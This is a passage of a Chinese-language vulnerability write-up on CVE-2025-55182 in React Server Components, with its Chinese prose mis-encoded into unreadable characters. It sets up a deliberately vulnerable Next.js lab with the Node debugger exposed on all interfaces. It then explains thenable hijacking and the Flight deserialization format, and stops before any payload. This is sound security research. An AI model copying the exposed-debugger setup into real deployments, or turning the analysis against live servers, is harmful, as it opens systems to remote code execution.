CVE-2025-55182: React2Shell
===

>æœ¬åšå®¢å¯¹CVE-2025-55182 (React2Shell) çš„æŠ€æœ¯åˆ†æä»…ç”¨äºæ•™è‚²ç›®çš„ï¼Œæ—¨åœ¨ä¿ƒè¿›ç½‘ç»œå®‰å…¨ç ”ç©¶ä¸é˜²å¾¡æŠ€æœ¯çš„äº¤æµã€‚

## Docker æ­å»ºé¶åœº

å‚è€ƒè‡ª: [çŸ¥è¯†æ˜Ÿçƒ](https://govuln.com/topic/)

### æ–‡ä»¶å‡†å¤‡

å…ˆè£…ä¸€ä¸ªå­˜åœ¨è¯¥æ¼æ´çš„ç‰ˆæœ¬, ä¾‹å¦‚ 15.5.6:

```bash
npx create-next-app@15.5.6 nextjs-1 --yes
```

è¿›å…¥åˆšåˆšçš„é¡¹ç›®æ–‡ä»¶å¤¹, æ–°å»º `dockerfile`:

```dockerfile
# ä½¿ç”¨å½“å‰ Next.js æ¨èçš„ Node è¿è¡Œæ—¶
FROM node:22-alpine

# å·¥ä½œç›®å½•
WORKDIR /app

# å¤åˆ¶ä¾èµ–æ–‡ä»¶ (åŠ å¿«æ„å»º) 
COPY package.json package-lock.json* yarn.lock* pnpm-lock.yaml* ./

# å®‰è£…ä¾èµ–
RUN npm install

# å¤åˆ¶å…¨éƒ¨ä»£ç 
COPY . .

# Next dev é»˜è®¤ç«¯å£
EXPOSE 3000
# Node inspector è°ƒè¯•ç«¯å£
EXPOSE 9229

# è®¾ç½®è°ƒè¯•ç¯å¢ƒå˜é‡
ENV NODE_OPTIONS="--inspect=0.0.0.0:9229"

# é»˜è®¤å¯åŠ¨ next dev
CMD ["npm", "run", "dev"]
```

æ–°å»º `docker-compose.yml`:

```yml
version: "3.9"

services:
  nextjs:
    build:
      context: .
      dockerfile: Dockerfile
    container_name: nextjs-15-dev
    ports:
      - "3000:3000"
      - "9229:9229"
      - "9230:9230"
    environment:
      - NODE_ENV=development
      - NODE_OPTIONS=--inspect=0.0.0.0:9229
    volumes:
      - .:/app
      - /app/node_modules
    command: npm run dev
```

### æ„å»ºå®¹å™¨

```bash
docker-compose up --build
```

è®¿é—® 9229 ç«¯å£:

![1-1.png](1-1.png)

è®¿é—® 3000 ç«¯å£:

![1-2.png](1-2.png)

> æ³¨æ„, éœ€è¦è®¾ç½® `ENV NODE_OPTIONS="--inspect=0.0.0.0:9229"`, å¦‚æœä¸åœ¨ docker å†…åˆ™éœ€è¦è®¾ç½® `export NODE_OPTIONS="--inspect=0.0.0.0:9229"`; 

ç½‘ç«™ä¸»è¦ç”¨åˆ°çš„ç«¯å£:
- 3000: Web åº”ç”¨ç«¯å£;
- 9229: dev æœåŠ¡å™¨çš„å®ˆæŠ¤è¿›ç¨‹ç«¯å£;
- 9330: åº”ç”¨è¿›ç¨‹è°ƒè¯•ç«¯å£;

### è°ƒè¯•

ç”¨ Google Chrome è°ƒè¯•é…ç½®:

åœ¨ Chrome æµè§ˆå™¨ä¸­è¾“å…¥ `chrome://inspect` å¹¶å¼€å¯ 9230 ç«¯å£åˆ°è¿œç¨‹åœ°å€, ç„¶åé‡å¯å®¹å™¨:

![1-3.png](1-3.png)

ä¹‹åå†åœ¨ Chrome DevTools ä¸­ç¦ç”¨å¿½ç•¥åˆ—è¡¨ (Enable Ignoring Listing), å°±èƒ½çœ‹åˆ°äº†:

![1-4.png](1-4.png)

![1-5.png](1-5.png)

## åŸç†ç®€è¿°

### Promise å¯¹è±¡

#### é“¾å¼è°ƒç”¨

> å¼•ç”¨è‡ªçŸ¥è¯†æ˜Ÿçƒ P ç¥çš„åšå®¢;

æ—©æœŸçš„ JS ä»£ç ä¸­å«æœ‰å¤§é‡å‡½æ•°åµŒå¥—, ä½¿å¾—ç»´æŠ¤è°ƒè¯•å›°éš¾, ä»£ç ä¸æ˜“å¤ç”¨, ä¾‹å¦‚:

```javascript
// BEFORE: åµŒå¥—å›è°ƒ - å¤šä¸ªç‹¬ç«‹ä¸Šä¸‹æ–‡ï¼Œå˜é‡éœ€æ‰‹åŠ¨ä¼ é€’
getUser((err, user) => {
    if (err) handle(err);
    getPosts(user.id, (err, posts) => {
        if (err) handle(err);  // é‡å¤é”™è¯¯å¤„ç†
        getComments(posts[0].id, (err, comments) => {
            // userå˜é‡ä»å¯è®¿é—®ï¼Œä½†ä½œç”¨åŸŸåµŒå¥—å¤ªæ·±
        });
    });
});
```

å› æ­¤ä» ES6 å¼€å§‹, javascript å¼•å…¥äº† Promise è¿™ä¸ªå¯¹è±¡ã€‚Promise å¯¹è±¡å°†å‡½æ•°åµŒå¥—è½¬æ¢ä¸ºé“¾å¼è°ƒç”¨, ä¾‹å¦‚:

```javascript
// AFTER: Promiseé“¾ - ç»Ÿä¸€ä¸Šä¸‹æ–‡ï¼Œçº¿æ€§ä½œç”¨åŸŸ
getUser()
    .then(user => {
        this.user = user;  // å¯ä¿å­˜åœ¨å¤–éƒ¨å˜é‡
        return getPosts(user.id);
    })
    .then(posts => {
        // ä»å¯è®¿é—® this.user
        return getComments(posts[0].id);
    })
    .catch(handleError); // ç»Ÿä¸€é”™è¯¯å¤„ç†ç‚¹

// æ›´è¿›ä¸€æ­¥ï¼šasync/await çš„çœŸæ­£ç»Ÿä¸€ä¸Šä¸‹æ–‡
async function process() {
    try {
        const user = await getUser();     // åŒä¸€ä½œç”¨åŸŸ
        const posts = await getPosts(user.id);
        const comments = await getComments(posts[0].id);
        // æ‰€æœ‰å˜é‡åœ¨åŒä¸€ä½œç”¨åŸŸï¼Œè°ƒè¯•æå…¶æ–¹ä¾¿
    } catch (error) {
        handleError(error);
    }
}
```

å°±åƒ Spring çš„ bean é“¾å¼æ„å»ºä¸€æ ·, Promise å¯¹è±¡å¯ä»¥ç»´æŠ¤ç»Ÿä¸€çš„æ–¹æ³• (`then/catch`) å¹¶æŒç»­ return ä¸€ä¸ª Promiseã€‚

#### æœ‰é™çŠ¶æ€æœº

è§‚å¯Ÿè¿™æ®µå˜åŒ–:

```javascript
// BEFORE
func1(function() {
  func2(function() {
    func3(function() {
      ...

// AFTER
func1()
  .then(func2)
  .then(func3)
  .catch(handleError);
```

å¯ä»¥çœ‹å‡º, Promise åªå­˜åœ¨ 3 ä¸ªçŠ¶æ€:

- pending
- fulfilled
- rejected

çŠ¶æ€æœºå†…éƒ¨è°ƒåº¦, `then()` çš„è¿”å›å€¼ä¼šå†³å®šä¸‹ä¸€ç¯çš„æ‰§è¡Œ:

| then çš„è¿”å›å€¼ | ä¸‹ä¸€ç¯æ”¶åˆ°çš„         |
| ------------- | -------------------- |
| æ™®é€šå€¼        | ç›´æ¥è¿›å…¥ fulfilled   |
| Promise       | ç­‰å®ƒ resolve åç»§ç»­  |
| æŠ›å¼‚å¸¸        | è‡ªåŠ¨è¿›å…¥ä¸‹ä¸€ç¯ `catch()` |

#### Thenable

ä¸ºäº†ä¿è¯å¯¹è€ä»£ç çš„å…¼å®¹, JS å¼•å…¥äº† thenable è¿™ä¸ªæ¦‚å¿µ: **ä»»ä½•å¯¹è±¡åªè¦æœ‰ `then()` è¿™ä¸ªæ–¹æ³•, å°±æ˜¯ä¸€ä¸ª thenable å¯¹è±¡**; å®ƒå¯ä»¥æ›¿ä»£ Promise çš„åŠŸèƒ½ï¼Œåœ¨ await ç­‰éœ€è¦ Promise çš„ä½ç½®ä½¿ç”¨ (åœ¨ `then()` é‡Œå†™ä¸€ä¸ªé—­åŒ…)ã€‚

#### å®‰å…¨éšæ‚£

Promise çš„è®¾è®¡åˆè¡·æ˜¯å¯ç»´æŠ¤æ€§, ä½†å…¶ç»Ÿä¸€æ¥å£ + å¯ç»„åˆæ€§ä¸ºæ”»å‡»é“¾æ„é€ æä¾›äº†ä¾¿åˆ©; æ§åˆ¶æµå…¨éƒ¨ç”± `then` / `catch` ç»´æŠ¤, ä½¿å¾—ä»£ç æ›´åŠ å®¹æ˜“æŒ‚è½½, å¹¶ä¸”æ›´å¥½é¢„æµ‹ã€‚

ç»“åˆ Thenable åè®®, ä»»ä½•å¯¹è±¡ (å³ä½¿é Promise), åªè¦ Key å€¼å¯ä»¥è¢«ç”¨æˆ·æ§åˆ¶, é‚£ä¹ˆå°±å¯ä»¥ä¼ªé€ ä¸€ä¸ª Thenable å¯¹è±¡;

> æ”»å‡»è€…ç”šè‡³ä¸éœ€è¦çœŸçš„æ„é€  Promise, åªè¦ä¸€ä¸ªå¯¹è±¡å¸¦ then å±æ€§å³å¯åŠ«æŒæ‰§è¡Œé“¾ã€‚

### React Server Components (RSC) 

> å‚è€ƒåšå®¢: [CVE-2025-55182 React Server Components ååºåˆ—åŒ–æ¼æ´åŸç†æ·±åº¦åˆ†æ](https://rustlang.rs/posts/CVE-2025-55182/#%E4%BA%8Creact-server-components-%E6%8A%80%E6%9C%AF%E8%83%8C%E6%99%AF)

RSC æ˜¯ React 18 å¼•å…¥çš„æ–°èŒƒå¼, å…è®¸ç»„ä»¶åœ¨æœåŠ¡ç«¯æ¸²æŸ“å¹¶å°†ç»“æœæµå¼ä¼ è¾“åˆ°å®¢æˆ·ç«¯ã€‚

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    React Server Components æ¶æ„                  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                  â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                      â”‚
â”‚  â”‚   Browser    â”‚ â†â”€â”€â”€â”€â”€â†’ â”‚   Server     â”‚                      â”‚
â”‚  â”‚              â”‚  HTTP   â”‚              â”‚                      â”‚
â”‚  â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚         â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚                      â”‚
â”‚  â”‚ â”‚ Client   â”‚ â”‚         â”‚ â”‚ Server   â”‚ â”‚                      â”‚
â”‚  â”‚ â”‚Componentsâ”‚ â”‚         â”‚ â”‚Componentsâ”‚ â”‚                      â”‚
â”‚  â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚         â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚                      â”‚
â”‚  â”‚      â†‘       â”‚         â”‚      â†“       â”‚                      â”‚
â”‚  â”‚      â”‚       â”‚         â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚                      â”‚
â”‚  â”‚      â””â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”‚ Flight â”‚  â”‚                      â”‚
â”‚  â”‚   Flight     â”‚         â”‚  â”‚Protocolâ”‚  â”‚                      â”‚
â”‚  â”‚   Protocol   â”‚         â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚                      â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                      â”‚
â”‚                                                                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

å¦‚å›¾æ‰€ç¤º, ä¸ä¼ ç»Ÿ SSR ä¸åŒ, RSC å¯ä»¥ç›´æ¥è®¿é—®æœåŠ¡ç«¯èµ„æºè€Œæ— éœ€ API; ä¿æŒäº†äº¤äº’æ€§ä½¿å®¢æˆ·ç«¯å¯ä»¥æ— ç¼åä½œ

### React Server Functions

React Server Functions (æˆ– Server Actions) å…è®¸å®¢æˆ·ç«¯åƒè°ƒç”¨æœ¬åœ°å‡½æ•°ä¸€æ ·è°ƒç”¨æœåŠ¡ç«¯å‡½æ•°:

#### è°ƒç”¨ä¾‹

- Server Function å®šä¹‰æ–¹å¼

```javascript
// app/actions.js
'use server'  // æ ‡è®°ä¸º Server Function

export async function submitForm(formData) {
    // è¿™æ®µä»£ç åªåœ¨æœåŠ¡ç«¯æ‰§è¡Œ
    const name = formData.get('name');
    await db.users.create({ name });
    return { success: true };
}
```

- å®¢æˆ·ç«¯è°ƒç”¨æ–¹å¼

```javascript
// app/page.jsx (Client Component)
'use client'
import { submitForm } from './actions';

export default function Form() {
    async function handleSubmit(e) {
        e.preventDefault();
        const formData = new FormData(e.target);
        // çœ‹èµ·æ¥åƒæœ¬åœ°è°ƒç”¨ï¼Œå®é™…æ˜¯ HTTP POST
        const result = await submitForm(formData);
    }
    return <form onSubmit={handleSubmit}>...</form>;
}
```

#### åº•å±‚é€šä¿¡

Flight åè®®å®é™…ä¸Šå°±æ˜¯ç»™é€šä¿¡åŠ äº†ä¸€å±‚å£³, è¿™ä¸ªå£³çš„ä½œç”¨å’Œ Python ä¸­çš„ pickle åŒ…æ˜¯ç±»ä¼¼çš„, å®šä¹‰äº†å‘é€, è§£æçš„æ ¼å¼:

```mermaid
sequenceDiagram
    participant Client as å®¢æˆ·ç«¯ç»„ä»¶ (æµè§ˆå™¨) 
    participant Flight as Flight åºåˆ—åŒ–å™¨ (å®¢æˆ·ç«¯) 
    participant HTTP as HTTP POST è¯·æ±‚
    participant Server as Server Function æ‰§è¡Œå™¨
    participant FlightSrv as Flight åºåˆ—åŒ–å™¨ (æœåŠ¡ç«¯) 
    participant React as React æ¸²æŸ“å™¨ (å®¢æˆ·ç«¯) 

    Note over Client: ç”¨æˆ·è°ƒç”¨ submitForm(formData)

    Client->>Flight: 1. å°†å‚æ•°åºåˆ—åŒ–ä¸º<br/>Flight åè®®æ ¼å¼
    Flight->>HTTP: 2. å‘é€ HTTP POST è¯·æ±‚

    HTTP->>HTTP: 3. æ·»åŠ è¯·æ±‚å¤´ï¼šNext-Action: action-id
    HTTP->>HTTP: 4. è¯·æ±‚ä½“ä¸º multipart/form-data<br/> (åŒ…å« Flight æ•°æ®å—) 

    HTTP->>FlightSrv: 5. æœåŠ¡ç«¯ååºåˆ—åŒ– Flight æ•°æ®
    FlightSrv->>Server: 6. æ‰§è¡Œå¯¹åº”çš„ Server Function

    Server->>FlightSrv: 7. å°†è¿”å›å€¼åºåˆ—åŒ–ä¸º Flight æ ¼å¼
    FlightSrv->>React: 8. å®¢æˆ·ç«¯ååºåˆ—åŒ–å¹¶æ›´æ–° React ç»„ä»¶æ ‘
```

#### Server Action è¯·æ±‚æ ¼å¼

```http
POST /page-url HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk
Next-Action: 1a2b3c4d5e6f7890abcdef1234567890abcdef12
Next-Router-State-Tree: [encoded-tree]

------WebKitFormBoundary7MA4YWxk
Content-Disposition: form-data; name="1_$ACTION_ID_1a2b3c..."

------WebKitFormBoundary7MA4YWxk
Content-Disposition: form-data; name="0"

["$K1"]
------WebKitFormBoundary7MA4YWxk--
```

|Header|åŠŸèƒ½|ç‰¹ç‚¹|ç¤ºä¾‹|
|----|----|----|----|
|`Next-Action`|Server Action çš„å”¯ä¸€æ ‡è¯†ç¬¦|40 å­—ç¬¦å“ˆå¸Œ|`1218dsu2132dd..`|
|`Content-Type`| å†…å®¹ç±»å‹ |åªèƒ½æ˜¯ `multipart/form-data`|`multipart/form-data; boundary=...`|
|`Next-Router-State-Tree`|è·¯ç”±çŠ¶æ€|å¯é€‰é¡¹|`[encoded]`|

#### Action ID ç”Ÿæˆ

é€»è¾‘ç®€åŒ–:

```javascript
// Next.js å†…éƒ¨ç”Ÿæˆé€»è¾‘ (ç®€åŒ–) 
actionId = hash(
    filePath +          // æ–‡ä»¶è·¯å¾„: "app/actions.js"
    exportName +        // å¯¼å‡ºå: "submitForm"
    functionBody        // å‡½æ•°ä½“å“ˆå¸Œ
);
```

éœ€è¦æ³¨æ„çš„æ˜¯, å¯¹äº **Next.js 15+**, è¿™é‡Œçš„å“ˆå¸Œä¸æ˜¯ SHA1/MD5 ,è€ŒåŠ å¯†ã€éç¡®å®šæ€§çš„æ ‡è¯†ç¬¦, è¿™äº›æ ‡è¯†åœ¨ä¸åŒæ„å»ºä¹‹é—´å¯èƒ½å˜åŒ–ã€‚**åœ¨ç¼–è¯‘æ—¶ç”Ÿæˆï¼Œå¹¶åœ¨æ„å»ºä¹‹é—´å‘¨æœŸæ€§é‡æ–°è®¡ç®—ä»¥å¢å¼ºå®‰å…¨æ€§ã€‚**

> æ—§ç‰ˆæœ¬ä¸­å¯èƒ½æ˜¯åŸºäº SHA-1

### React Flight åè®®

Filght åè®®æ˜¯ä¸€ä¸ª**è‡ªå®šä¹‰æµå¼åºåˆ—åŒ–åè®®**, å…¶ä½œç”¨å°±å’Œ php, python pickle ä¸­çš„åºåˆ—è¯»å–ç±»ä¼¼;

|ç›®æ ‡|   è¯´æ˜|
|----|----|
|æµå¼ä¼ è¾“|æ”¯æŒè¾¹æ¸²æŸ“è¾¹ä¼ è¾“, æ— éœ€ç­‰å¾…å®Œæ•´å“åº”|
|å¼•ç”¨å…±äº«|ç›¸åŒæ•°æ®åªä¼ è¾“ä¸€æ¬¡, é€šè¿‡ ID å¼•ç”¨|
|ç±»å‹ä¿ç•™|ä¿ç•™ React ç‰¹æœ‰ç±»å‹ (Promiseã€ç»„ä»¶ã€å‡½æ•°å¼•ç”¨ç­‰) |
|ç´§å‡‘é«˜æ•ˆ|æ¯”çº¯ JSON æ›´ç´§å‡‘, å‡å°‘ä¼ è¾“ä½“ç§¯|
|åŒå‘æ”¯æŒ|æœåŠ¡ç«¯â†’å®¢æˆ·ç«¯ (æ¸²æŸ“) å’Œå®¢æˆ·ç«¯â†’æœåŠ¡ç«¯ (Server Actions) |

> ç´§å‡‘é«˜æ•ˆ
>
>    Flight æ”¯æŒåˆ†å—å¼•ç”¨:
>
>    ```javascript
>    // æ™®é€š JSON - æ— æ³•è¡¨ç¤ºå¼•ç”¨ã€Promiseã€å‡½æ•°ç­‰
>    {
>        "user": {"name": "Alice"},
>        "posts": [{"author": {"name": "Alice"}}]  // user é‡å¤ä¼ è¾“
>    }
>    ```
>
>    ```javascript
>    // Flight åè®® - æ”¯æŒå¼•ç”¨å…±äº«
>    0:{"name":"Alice"}           // Chunk 0: user å¯¹è±¡
>    1:{"author":"$0"}            // Chunk 1: å¼•ç”¨ Chunk 0
>    2:{"user":"$0","posts":["$1"]}  // Chunk 2: æ ¹å¯¹è±¡
>    ```

#### Flight æ•°æ®æ ¼å¼

Flight åè®®çš„æ•°æ®æ ¼å¼:

```
<id>:<type>{<map> (é”®å€¼å¯¹)}
```

å¸¸è§ Type:

|Type|è¯´æ˜|ç”¨ä¾‹|
|:----:|----|----|
|`<ç©º>`|æ¨¡å‹æ•°æ® (json)|`0:{"name":"Alice"}`|
|`I`|æ¨¡å—å¯¼å…¥|`0:I{"id":"./page.js","name":"default"}`|
|`H`| æŒ‡ä»¤|`0:H["prefetch","/api"]`|
|`S`|Symbol| `0:S"react.element"`|
|`E`|é”™è¯¯|`0:E{"message":"Error"}`|

ä¸€ä¸ªå®Œæ•´çš„ Filght å“åº”ç¤ºä¾‹:

```json
0:I{"id":"./app/page.js","name":"default","chunks":["app/page"]}
1:{"name":"Alice","age":25}
2:["$","div",null,{"children":[["$","h1",null,{"children":"Hello"}],"$L3"]}]
3:{"user":"$1","loading":false}
```

#### Chunk çŠ¶æ€æœº

Chunk ä¹Ÿæ˜¯ä¸€ä¸ªçŠ¶æ€æœº, å…·æœ‰å’Œ Promise å¯¹è±¡ç›¸åŒçš„ä¸‰ä¸ªçŠ¶æ€: - pending, fulfilled, rejected (å› ä¸º Chunk æœ¬è´¨ä¸Šå°±æ˜¯ç»§æ‰¿ Promise å¯¹è±¡), åœ¨æ­¤åŸºç¡€ä¸Š, æ·»åŠ äº†ä¸¤ä¸ªæ–°çŠ¶æ€:

---

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                         Chunk çŠ¶æ€è½¬æ¢å›¾                                 â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                          â”‚
â”‚              â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                            â”‚
â”‚              â”‚   pending   â”‚ â† åˆå§‹çŠ¶æ€ï¼Œç­‰å¾…æ•°æ®åˆ°è¾¾                    â”‚
â”‚              â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜                                            â”‚
â”‚                     â”‚                                                    â”‚
â”‚                     â”‚ æ”¶åˆ° Flight è¡Œæ•°æ®                                 â”‚
â”‚                     â–¼                                                    â”‚
â”‚           â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                           â”‚
â”‚           â”‚ resolved_model  â”‚ â† æœ‰åŸå§‹ JSON å­—ç¬¦ä¸²ï¼Œå¾…è§£æ               â”‚
â”‚           â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜                                           â”‚
â”‚                    â”‚                                                     â”‚
â”‚                    â”‚ è¢« await æˆ–è®¿é—® .value æ—¶                           â”‚
â”‚                    â”‚ è°ƒç”¨ initializeModelChunk()                         â”‚
â”‚                    â–¼                                                     â”‚
â”‚     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                        â”‚
â”‚     â”‚                                          â”‚                        â”‚
â”‚     â–¼                                          â–¼                        â”‚
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                  â”‚
â”‚ â”‚  fulfilled  â”‚ â† è§£ææˆåŠŸï¼Œæœ‰æœ€ç»ˆå€¼    â”‚  rejected   â”‚ â† è§£æå¤±è´¥       â”‚
â”‚ â”‚             â”‚                        â”‚             â”‚                  â”‚
â”‚ â”‚ chunk.value â”‚                        â”‚chunk.reason â”‚                  â”‚
â”‚ â”‚ = è§£æç»“æœ  â”‚                        â”‚ = Error     â”‚                  â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                  â”‚
â”‚                                                                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

#### Chunk å†…éƒ¨æ•°æ®ç»“æ„

```javascript
// React æºç : packages/react-client/src/ReactFlightClient.js

// Chunk æœ¬è´¨æ˜¯ä¸€ä¸ª ReactPromise å¯¹è±¡
function ReactPromise(status, value, reason, response) {
    this.status = status;      // "pending" | "resolved_model" | "fulfilled" | "rejected"
    this.value = value;        // pending æ—¶æ˜¯ç›‘å¬å™¨æ•°ç»„ï¼Œfulfilled æ—¶æ˜¯è§£æç»“æœ
    this.reason = reason;      // pending æ—¶æ˜¯ç›‘å¬å™¨æ•°ç»„ï¼Œrejected æ—¶æ˜¯é”™è¯¯
    this._response = response; // æ‰€å±çš„ Response å¯¹è±¡
}

// Chunk ç»§æ‰¿ Promise è¡Œä¸º
ReactPromise.prototype = Object.create(Promise.prototype);

// å…³é”®çš„ then æ–¹æ³•å®ç°
ReactPromise.prototype.then = function(resolve, reject) {
    var chunk = this;
    switch (chunk.status) {
        case "fulfilled":
            resolve(chunk.value);
            break;

        case "pending":
        case "blocked":
            // æ·»åŠ åˆ°ç›‘å¬å™¨é˜Ÿåˆ—
            if (resolve) chunk.value.push(resolve);
            if (reject) chunk.reason.push(reject);
            break;

        case "resolved_model":
            // âš ï¸ å…³é”®ï¼šè§¦å‘è§£æ
            initializeModelChunk(chunk);
            // è§£æåé€’å½’å¤„ç†
            chunk.then(resolve, reject);
            break;

        case "rejected":
            reject(chunk.reason);
            break;
    }
};
```

#### Response å¯¹è±¡

Flight è§£æä¼šè¯åˆ›å»ºä¸€ä¸ª Response å¯¹è±¡, ç®¡ç†æ‰€æœ‰ Chunk:

```javascript
function createResponse(bundlerConfig, formData, prefix) {
    return {
        _bundlerConfig: bundlerConfig,  // Webpack/Turbopack é…ç½®
        _formData: formData,            // åŸå§‹ FormDataï¼ˆServer Actionï¼‰
        _prefix: prefix,                // Chunk ID å‰ç¼€
        _chunks: new Map(),             // id â†’ Chunk æ˜ å°„
        _closed: false,                 // æµæ˜¯å¦å…³é—­
        _closedReason: null,            // å…³é—­åŸå› 
    };
}

// ä» Response è·å–æˆ–åˆ›å»º Chunk
function getChunk(response, id) {
    let chunk = response._chunks.get(id);
    if (!chunk) {
        // ä» FormData è·å–æ•°æ®
        const data = response._formData.get(response._prefix + id);
        if (data != null) {
            chunk = new ReactPromise("resolved_model", data, id, response);
        } else {
            chunk = new ReactPromise("pending", [], [], response);
        }
        response._chunks.set(id, chunk);
    }
    return chunk;
}
```

#### ç‰¹æ®Šå˜é‡

`$` å‰ç¼€ç³»ç»Ÿæ¥è¡¨ç¤ºç‰¹æ®Šå€¼ã€‚

##### å¸¸è§å­—ç¬¦è¡¨

| å‰ç¼€ | ç±»å‹è¯´æ˜        | ç¤ºä¾‹           | å«ä¹‰æè¿°                | è§£ææ–¹å¼                     |
| ---- | --------------- | -------------- | ----------------------- | ---------------------------- |
| `$`    | Chunk å¼•ç”¨      | "$123"         | å¼•ç”¨ chunk 123 çš„è§£æå€¼ | getChunk(123).value          |
| `$@`   | **åŸå§‹ Chunk**      | "$@123"        | è·å– chunk å¯¹è±¡æœ¬èº«     | getChunk(123) (ä¸è§£å¼•ç”¨)     |
| `$L`   | Lazy å¼•ç”¨       | "$L123"        | æƒ°æ€§åŠ è½½çš„ chunk        | è¿”å› lazy wrapper            |
| `$F`   | Server Function | "$F123"        | æœåŠ¡ç«¯å‡½æ•°å¼•ç”¨          | åˆ›å»ºä»£ç†å‡½æ•°                 |
| `$B`   | Blob æ•°æ®       | "$B123"        | äºŒè¿›åˆ¶æ•°æ®              | `formData.get(prefix + "123")` |
| `$K`   | FormData        | "$K123"        | FormData å¼•ç”¨           | è§£æ FormData                |
| `$Q`   | Map å¼•ç”¨        | "$Q123"        | Map æ•°æ®ç»“æ„            | è§£æä¸º Map                   |
| `$W`   | Set å¼•ç”¨        | "$W123"        | Set æ•°æ®ç»“æ„            | è§£æä¸º Set                   |
| `$n`   | Number          | "$n123"        | å¤§æ•°å­—                  | BigInt(123)                  |
| `$u`   | undefined       | "$undefined"   | undefined å€¼            | `undefined`                    |
| `$D`   | Date            | "$D2024-01-01" | æ—¥æœŸå¯¹è±¡                | new Date(...)                |
| `$$`   | è½¬ä¹‰            | "$$abc"        | å­—é¢é‡ $abc             | `$abc` (å»æ‰ä¸€ä¸ª $)          |

##### `$` é“¾å¼å±æ€§è®¿é—®

é™¤äº†ç®€å•å¼•ç”¨å¤–, Flight è¿˜æ”¯æŒé“¾å¼è®¿é—®:

```javascript
// è¯­æ³•: "$<chunkId>:<key1>:<key2>:..."

// ç¤ºä¾‹: "$1:user:profile:name"
// ç­‰ä»·äº: getChunk(1).value.user.profile.name
```

è§£ææºä»£ç :

```javascript
function parseModelString(response, parentObj, key, value) {
    if (value[0] === '$') {
        switch (value[1]) {
            case '$':
                return value.slice(1);  // è½¬ä¹‰
            case '@':
                // åŸå§‹ chunk å¼•ç”¨
                return getChunk(response, parseInt(value.slice(2), 16));
            case 'B':
